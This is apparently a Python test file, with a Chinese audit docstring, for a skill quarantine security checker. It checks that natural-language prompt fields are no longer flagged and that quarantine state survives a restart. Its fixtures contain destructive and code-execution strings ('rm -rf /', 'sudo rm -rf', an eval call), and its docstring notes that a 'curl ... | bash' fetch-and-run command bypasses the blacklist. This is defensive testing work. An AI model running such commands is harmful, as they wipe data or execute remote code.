"""批201 DB53＋DB53b 门：技能隔离门「错杀＋重启后不自愈」收编
（第三期审计报告 第十九轮 · DB53 high / DB53b medium）。

DB53 病根（`butler/skills/quarantine.py` 原 :82-88）：
    skill_str = json.dumps(skill, ensure_ascii=False).lower()   # 整个技能，含自然语言
    for pattern in DANGEROUS_PATTERNS:                          # 黑名单里有裸词 "format"
        if pattern.lower() in skill_str: return False, ...

⇒ `prompt: "Format the reply as one line"` 就被判安全违规，随后 `runner.py:182`
`quarantine()` → `store.quarantine()` **持久化** `status=quarantined, enabled=false`。
对照实测（报告第十九轮）：合法技能放行率 **1/5 → 5/5**。

DB53b 病根（原 :63 / :168）：
    self._quarantined_at: dict[str, float] = {}      # 纯内存，重启即失
    for ... in list(self._quarantined_at.items()):   # auto_recover_check 只遍历内存
⇒ 盘上 `status=quarantined` 的技能**永不自动恢复**（且 `auto_recover_check` 只有一个
手动 API 调用方 `skill_routes.py:248`，无调度）。叠加 DB53：「一个误判 + 一次重启
= 技能永久死亡，且没有自愈路径」。

口径（⛔ 两处各写各的）：
  ① `check_security` 从整体序列化改成递归 `_scannable_strings`，跳过 `_NL_SKIP_KEYS`
     （prompt/system/name/text/say/speak/content/message/title/role/description/
     message_template/quarantine_reason）——这些是喂给 LLM 或给人看的文本，本身不被
     执行，扫它们语义上就是错的。取「跳过 NL 字段」而非「白名单可执行字段」的口径：
     新字段出现时**仍被扫**（⛔ 静默漏检），残余风险方向是「未预见的 NL 字段含
     `eval(` 等特征串→可能误杀」，比「新增可执行字段被静默放过」（fail-open）安全。
  ② 删黑名单里的裸词 `"format"`——磁盘格式化由 `"mkfs"` 覆盖。
  ③ `_rebuild_quarantined_at()` 在 `__init__` 末尾从 `store.list(status="quarantined")`
     重建——store 是唯一真源，顺带覆盖两条绕过管理器的写入路径：
     `runner._record_failure` 直调 `store.quarantine()`、`skill_routes` 的 mgr-None fallback。

如实说明（⛔ 不往好了说）：
  - DB53 的「真实 LLM 会不会生成含 format 的 prompt」是推断（构造输入），非实测。
    但 `brain = dict(brain_raw)` 原样透传＋prompt 自由文本是源码事实（schema.py:96）。
  - `curl http://x|bash` **两版都绕过**（黑名单写 "curl | bash" 带空格，实际命令 URL 在中间）
    ——**非回归**，两版一致。
  - check_security 从不是真正的安全边界（4/4 绕过形态原实现都拦不住）——真正边界是
    引擎白名单＋sandbox 审批（DB26/DB27 那条线）。宁可少拦，不要错杀。
"""
from __future__ import annotations

import ast
import pathlib
import tempfile
import unittest

from butler.skills import quarantine as q

ROOT = pathlib.Path(__file__).resolve().parents[1]
QUARANTINE_PY = ROOT / "butler" / "skills" / "quarantine.py"


class _FakeStore:
    """内存 store 桩：`list(status=)` 是 DB53b 重建唯一的真源。"""

    def __init__(self, skills: list[dict]):
        self._rows = {s["id"]: dict(s) for s in skills}

    def get(self, skill_id):
        return self._rows.get(skill_id)

    def list(self, source="", status=""):
        rows = list(self._rows.values())
        if source:
            rows = [s for s in rows if s.get("source") == source]
        if status:
            rows = [s for s in rows if s.get("status") == status]
        return rows

    def save(self, skill):
        self._rows[skill["id"]] = skill

    def set_status(self, skill_id, status):
        s = self._rows.get(skill_id)
        if s is None:
            return None
        s["status"] = status
        s["enabled"] = status == "enabled"
        return s

    def quarantine(self, skill_id, reason=""):
        s = self._rows.get(skill_id)
        if s is None:
            return None
        s["status"] = "quarantined"
        s["enabled"] = False
        s["quarantine_reason"] = reason
        s["quarantined_at"] = "2026-10-11T00:00:00"   # 模拟 store.py 的 time.strftime
        return s


def _skill(brain=None, **extra) -> dict:
    return {**{"id": "t1", "name": "测试技能", "status": "enabled", "enabled": True,
               "approval": "approved", "source": "user", "priority": 50,
               "brain": brain if brain is not None else {"engine": "static_text"}}, **extra}


class TestBatch201Db53NlSkipLeg(unittest.TestCase):
    """行为腿：合法放行 5/5、危险仍拦（对照报告第十九轮实测表）。"""

    def test_01_prompt_format_prose_is_let_through(self):
        """报告第十九轮原仓库 ❌ → 补丁 ✅ 的那一枚。"""
        mgr = q.QuarantineManager(_FakeStore([]), tempfile.mkdtemp(prefix="q53_"))
        skill = _skill(brain={"engine": "llm_text", "prompt": "Format the reply as one line"})
        ok, reason = mgr.check_security(skill)
        self.assertTrue(ok, f"prompt 里的 'format' 被当成格式化磁盘：{reason}")

    def test_02_prompt_json_format_phrase_is_let_through(self):
        mgr = q.QuarantineManager(_FakeStore([]), tempfile.mkdtemp(prefix="q53_"))
        skill = _skill(brain={"engine": "llm_text", "prompt": "请以 json format 输出"})
        ok, reason = mgr.check_security(skill)
        self.assertTrue(ok, f"中英文混排的 'json format' 不该命中：{reason}")

    def test_03_brain_output_format_value_is_let_through(self):
        """`output_format` 是字段名不是 NL，所以照样被扫——值 "json" 本身无害。"""
        mgr = q.QuarantineManager(_FakeStore([]), tempfile.mkdtemp(prefix="q53_"))
        skill = _skill(brain={"engine": "llm_text", "output_format": "json",
                              "prompt": "Format the reply as one line"})
        ok, reason = mgr.check_security(skill)
        self.assertTrue(ok, f"output_format='json' 不该命中：{reason}")

    def test_04_say_text_describing_rmrif_is_let_through(self):
        """科普文本「不要执行 rm -rf /」：`say` 是朗读文本，不会被执行。"""
        mgr = q.QuarantineManager(_FakeStore([]), tempfile.mkdtemp(prefix="q53_"))
        skill = _skill(brain={"engine": "llm_text", "say": "今天教你：不要执行 rm -rf /"})
        ok, reason = mgr.check_security(skill)
        self.assertTrue(ok, f"朗读文本里的 'rm -rf' 不该命中：{reason}")

    def test_05_plain_skill_control_group(self):
        mgr = q.QuarantineManager(_FakeStore([]), tempfile.mkdtemp(prefix="q53_"))
        ok, reason = mgr.check_security(_skill())
        self.assertTrue(ok, f"对照组被误杀：{reason}")

    def test_06_executable_action_rm_rf_still_caught(self):
        """`actions` 会被执行 ⇒ 危险命令必须拦。"""
        mgr = q.QuarantineManager(_FakeStore([]), tempfile.mkdtemp(prefix="q53_"))
        skill = _skill(actions=[{"shell": "rm -rf /"}])
        ok, reason = mgr.check_security(skill)
        self.assertFalse(ok, "actions 里的 rm -rf 没拦住")
        self.assertIn("rm -rf", reason)

    def test_07_executable_brain_data_eval_still_caught(self):
        """`brain.data` 会被当参数执行 ⇒ 必须拦。"""
        mgr = q.QuarantineManager(_FakeStore([]), tempfile.mkdtemp(prefix="q53_"))
        skill = _skill(brain={"engine": "ha_action", "data": "eval('import os')"})
        ok, reason = mgr.check_security(skill)
        self.assertFalse(ok, "brain.data 里的 eval( 没拦住")
        self.assertIn("eval(", reason)

    def test_08_builtin_templates_no_regression(self):
        """8 个内置模板判定无回归（报告第十九轮回归表：判定完全一致）。"""
        from butler.skills.templates import BUILTIN_TEMPLATES
        mgr = q.QuarantineManager(_FakeStore([]), tempfile.mkdtemp(prefix="q53_"))
        self.assertGreater(len(BUILTIN_TEMPLATES), 0, "模板表为空⇒本例是摆设")
        for tpl in BUILTIN_TEMPLATES:
            with self.subTest(template=tpl.get("name")):
                self.assertTrue(mgr.check_security(tpl), f"内置模板被误杀：{tpl.get('name')}")

    def test_09_new_executable_field_is_still_scanned(self):
        """「跳过 NL 字段」口径的承重点：⛔ 新增可执行字段被静默放过（fail-open）。"""
        mgr = q.QuarantineManager(_FakeStore([]), tempfile.mkdtemp(prefix="q53_"))
        skill = _skill(brain={"engine": "ha_action", "brand_new_key": "sudo rm -rf"})
        ok, reason = mgr.check_security(skill)
        self.assertFalse(ok, "未预见的可执行字段被静默放过")
        # 黑名单里 "rm -rf" 排在 "sudo rm" 前面，先命中谁看字典序，别把顺序钉进断言
        self.assertTrue(reason.endswith(("'rm -rf'", "'sudo rm'")), reason)

    def test_10_bare_format_removed_from_blacklist(self):
        self.assertNotIn("format", q.DANGEROUS_PATTERNS,
                         "裸词 'format' 还在黑名单⇒prompt 里的英文高频词就是违规")
        self.assertIn("mkfs", q.DANGEROUS_PATTERNS, "删了 format 却连 mkfs 一起删⇒磁盘格式化无人管")
        # 承重点：没有任何一条黑名单项会命中那句触发原始误杀的 prompt
        prose = "Format the reply as one line"
        for p in q.DANGEROUS_PATTERNS:
            self.assertFalse(p.lower() in prose.lower(),
                             f"黑名单项 '{p}' 会命中普通 prompt '{prose}'⇒错杀还没修干净")


class TestBatch201Db53bRebuildLeg(unittest.TestCase):
    """DB53b：隔离时刻从 store 重建，⛔ 内存字典一重启就丢。"""

    def test_11_rebuild_from_store_on_restart(self):
        store = _FakeStore([_skill()])
        mgr1 = q.QuarantineManager(store, tempfile.mkdtemp(prefix="q53_"))
        self.assertTrue(mgr1.quarantine("t1", "测试隔离"), "隔离没生效⇒重建无可对之物")
        self.assertIn("t1", mgr1._quarantined_at)

        # 重启：新建 manager（纯内存字典重置为 {}）
        mgr2 = q.QuarantineManager(store, tempfile.mkdtemp(prefix="q53_"))
        self.assertIn("t1", mgr2._quarantined_at,
                      "重启后 _quarantined_at 为空⇒盘上 quarantined 技能永不自动恢复")
        ts = mgr2._quarantined_at["t1"]
        self.assertLessEqual(ts, __import__("time").monotonic(),
                             "重建值在未来⇒24h 比较会立刻判过界")
        self.assertGreater(ts, 0.0, "重建值非正⇒像是没算")

    def test_12_catches_path_that_bypasses_the_manager(self):
        """`runner._record_failure` 直调 `store.quarantine()`（runner.py:105）
        完全绕过管理器记账 ⇒ 只留盘上 ISO 串。重建从 store 读＝唯一真源。"""
        store = _FakeStore([_skill()])
        store.quarantine("t1", "连续 3 次执行失败自动隔离")
        mgr = q.QuarantineManager(store, tempfile.mkdtemp(prefix="q53_"))
        self.assertIn("t1", mgr._quarantined_at,
                      "绕过管理器写入的隔离没被重建捕获⇒该技能永不自动恢复")

    def test_13_bad_iso_does_not_kill_the_rebuild(self):
        """一条坏 ISO 串⛔ 拖死整批重建：其余好的那条仍要建出来。"""
        bad = _skill(id="bad1", status="quarantined", quarantined_at="not-an-iso-date")
        good = _skill(id="good1", status="quarantined", quarantined_at="2026-10-11T00:00:00")
        store = _FakeStore([bad, good])
        mgr = q.QuarantineManager(store, tempfile.mkdtemp(prefix="q53_"))
        self.assertNotIn("bad1", mgr._quarantined_at, "坏 ISO 串不该被当成有效时刻")
        self.assertIn("good1", mgr._quarantined_at, "一条坏数据拖死了整批重建")

    def test_14_rebuild_skips_non_quarantined(self):
        store = _FakeStore([_skill(status="disabled"), _skill(id="q1", status="quarantined",
                                                                quarantined_at="2026-10-11T00:00:00")])
        mgr = q.QuarantineManager(store, tempfile.mkdtemp(prefix="q53_"))
        self.assertEqual(list(mgr._quarantined_at), ["q1"],
                         f"重建捞进了非 quarantined 的技能：{list(mgr._quarantined_at)}")


def _uses_dumps_blacklist_scan(fn_node):
    """形状尺：函数体里同时出现 `json.dumps` ＋ 黑名单成员判据（`in <Name>`）。

    原实现形状＝整体序列化后子串匹配，天然跨字段命中。
    """
    if fn_node is None:
        return False
    has_dumps = False
    has_member = False
    for n in ast.walk(fn_node):
        if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute) and n.func.attr == "dumps":
            has_dumps = True
        if isinstance(n, ast.Compare):
            for right in n.comparators:
                if isinstance(right, ast.Name):
                    has_member = True
                    break
    return has_dumps and has_member


class TestBatch201Db53ShapeRuler(unittest.TestCase):
    """形状尺：两侧校准，⛔ 只测放行（会漏掉判太宽）也⛔ 只测拦截（会漏掉尺写窄了）。"""

    def test_15_ruler_bites_the_synthetic_old_shape(self):
        old = ('import json\n'
               'BLACKLIST = ["rm -rf"]\n'
               'def check_security(self, skill):\n'
               '    s = json.dumps(skill, ensure_ascii=False).lower()\n'
               '    for p in BLACKLIST:\n'
               '        if p in s:\n'
               '            return False, p\n'
               '    return True, ""\n')
        fn = next(n for n in ast.walk(ast.parse(old))
                  if isinstance(n, ast.FunctionDef) and n.name == "check_security")
        self.assertTrue(_uses_dumps_blacklist_scan(fn), "尺子咬不住旧形状⇒test_16 是摆设")

    def test_16_production_check_security_is_not_the_dumps_shape(self):
        tree = ast.parse(QUARANTINE_PY.read_text(encoding="utf-8"))
        fn = None
        for node in ast.walk(tree):
            if (isinstance(node, ast.FunctionDef) and node.name == "check_security"
                    and isinstance(node.col_offset, int) and node.col_offset == 4):
                fn = node
        self.assertIsNotNone(fn, "找不到 QuarantineManager.check_security")
        self.assertFalse(_uses_dumps_blacklist_scan(fn),
                         "check_security 还在整体序列化扫描⇒NL 字段照样会被扫")


if __name__ == "__main__":
    unittest.main()
